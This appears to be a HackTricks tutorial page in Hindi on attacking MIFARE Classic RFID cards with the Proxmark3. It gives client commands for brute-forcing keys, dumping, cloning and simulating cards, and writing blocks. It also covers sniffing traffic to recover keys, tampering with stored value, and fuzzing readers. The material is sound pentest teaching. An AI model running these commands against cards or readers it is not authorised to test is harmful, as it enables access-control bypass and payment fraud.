# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Proxmark3 से RFID सिस्टम पर हमला

सक्रिय रूप से मेंटेन किए जा रहे RRG/Iceman Proxmark3 client और उससे मेल खाने वाला firmware इंस्टॉल करें। फिर उसी build के साथ command syntax की पुष्टि करें, क्योंकि नीचे दिए गए पुराने commands बदल चुके हो सकते हैं।<sup>[[1]](#references)[[5]](#references)</sup>

### MIFARE Classic 1KB पर हमला

MIFARE Classic 1K में **16 sectors** होते हैं, और हर sector में **16 bytes के 4 blocks** होते हैं। असली NXP cards में manufacturer block 0 में UID/manufacturer data होता है और यह read-only होता है; special clone या “magic” cards में इसे फिर से लिखना संभव हो सकता है।<sup>[[1]](#references)[[2]](#references)</sup>\
हर sector को access करने के लिए आपको **2 keys** (**A** और **B**) चाहिए, जो हर sector के **block 3** (sector trailer) में stored होती हैं। Sector trailer में **access bits** भी होते हैं, जो तय करते हैं कि 2 keys का इस्तेमाल करके **हर block** को **read और write** करने की permissions क्या होंगी।\
उदाहरण के लिए, अगर आपको पहली key पता है, तो उससे read करने और दूसरी key पता है, तो उससे write करने की permissions दी जा सकती हैं।

कई attacks किए जा सकते हैं

```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```

Proxmark3 अन्य कार्य भी कर सकता है, जैसे संवेदनशील डेटा खोजने के लिए **Tag to Reader communication** को **eavesdropping** करना। इस कार्ड में आप संचार को sniff करके इस्तेमाल की गई key की गणना कर सकते हैं, क्योंकि इस्तेमाल किए गए **cryptographic operations कमजोर हैं** और plain तथा cipher text जानने पर इसकी गणना की जा सकती है (`mfkey64` tool)।<sup>[[3]](#references)</sup>

#### MiFare Classic में stored-value के दुरुपयोग के लिए त्वरित workflow

key-recovery, balance-diffing, integrity-field और UID-cloning के क्रम के लिए—जिसमें Proxmark3 client transcript और magic-card की सीमाएँ शामिल हैं—देखें [MiFare Classic offline stored-value tampering](pentesting-rfid.md#mifare-classic-offline-stored-value-tampering-broken-crypto1)।

### Raw Commands

IoT systems कभी-कभी **गैर-ब्रांडेड या गैर-व्यावसायिक tags** का उपयोग करते हैं। ऐसे में, आप tags को custom **raw commands भेजने** के लिए Proxmark3 का उपयोग कर सकते हैं।

```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
  proprietary non iso14443-4 card found, RATS not supported
  No chinese magic backdoor command detected
  Prng detection: WEAK
  Valid ISO14443A Tag Found - Quitting Search
```

इस जानकारी के आधार पर आप कार्ड और उससे संचार करने के तरीके के बारे में जानकारी खोजने की कोशिश कर सकते हैं। Proxmark3 raw commands भेजने की सुविधा देता है, जैसे: `hf 14a raw -p -b 7 26`

### Scripts

Proxmark3 software में पहले से **automation scripts** की एक सूची मौजूद होती है, जिनका उपयोग आप सरल कार्य करने के लिए कर सकते हैं। पूरी सूची पाने के लिए `script list` command का उपयोग करें। इसके बाद, `script run` command के साथ script का नाम दें:

```
proxmark3> script run mfkeys
```

आप tag readers को fuzz करने के लिए एक script बना सकते हैं। किसी valid card का data copy करने के बाद, बस एक Lua script लिखें जो एक या अधिक random bytes को randomize करे और हर iteration में जांचे कि reader crash होता है या नहीं।

## References

- [1] [Proxmark3 विकी: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 विकी: HF Magic कार्ड](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [MIFARE Classic Crypto1 पर NXP का बयान](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [KioSoft Stored Value में NFC card vulnerability का exploitation (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — Linux installation](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
